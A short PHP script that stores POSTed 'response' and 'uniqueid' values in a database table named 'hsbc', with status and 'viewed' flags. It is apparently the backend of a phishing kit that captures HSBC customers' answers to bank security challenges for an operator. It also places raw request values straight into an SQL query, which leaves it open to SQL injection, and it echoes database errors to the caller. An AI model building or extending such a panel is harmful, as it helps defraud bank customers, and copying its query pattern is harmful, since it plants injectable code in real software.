<?php
require '../connection.php';

if ($_POST["response"] and $_POST["uniqueid"]) {
  $response = $_POST["response"];
  $uniqueid = $_POST["uniqueid"];

  $upload_challenge = mysqli_query($conn, "UPDATE hsbc SET `response`='$response', status=0, viewed='false' WHERE uniqueid=$uniqueid");

  if ($upload_challenge) {
    echo json_encode(array(
      'status' => 'success'
    ));
  } else {
    echo json_encode(array(
      'status' => 'failure',
      'error' => mysqli_error($conn)
    ));
  }
}
?>
